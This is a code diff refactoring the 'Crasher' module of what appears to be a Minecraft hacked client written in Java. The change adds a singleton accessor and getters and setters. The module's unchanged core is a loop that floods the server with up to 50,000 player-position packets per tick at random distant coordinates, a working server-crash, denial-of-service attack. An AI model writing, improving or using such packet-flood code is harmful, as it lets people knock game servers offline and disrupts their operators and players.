@@ -6,12 +6,13 @@ import neko.utils.Utils;
 import net.minecraft.network.play.client.C03PacketPlayer;
 
 public class Crasher extends Module {
-	
-	int delay = 0;
-	public static boolean wave = false;
+	private static Crasher instance;
+	private int delay = 0;
+	private boolean wave = false;
 	
 	public Crasher() {
 		super("Crasher", -1, Category.MISC, false);
+		this.instance = this;
 	}
 	
 	public void onEnabled() {		
@@ -27,17 +28,27 @@ public class Crasher extends Module {
 	}
 	
 	public void onUpdate() {
-		if (wave)
-			delay++;
-		if (delay >= 200) {
-			delay = 0;
-		}
+		if (this.wave) this.delay++;
+		if (this.delay >= 200) this.delay = 0;
+		
 		int spam = 0;
-		while (spam < 50000 && (Utils.limite ? Utils.limit > Utils.nbPack : true) && (wave ? delay <= 100 : true)) {
+		while (spam < 50000 && (Utils.limite ? Utils.limit > Utils.nbPack : true) && (this.wave ? this.delay <= 100 : true)) {
 			mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*1000000-5000000), (Math.random()*100+10), (Math.random()*1000000-5000000), true));
 			++spam;
 		}
 		super.onUpdate();
+	}
+
+	public static Crasher getInstance() {
+		return instance;
+	}
+
+	public boolean isWave() {
+		return wave;
+	}
+
+	public void setWave(boolean wave) {
+		this.wave = wave;
 	}
 	
 }
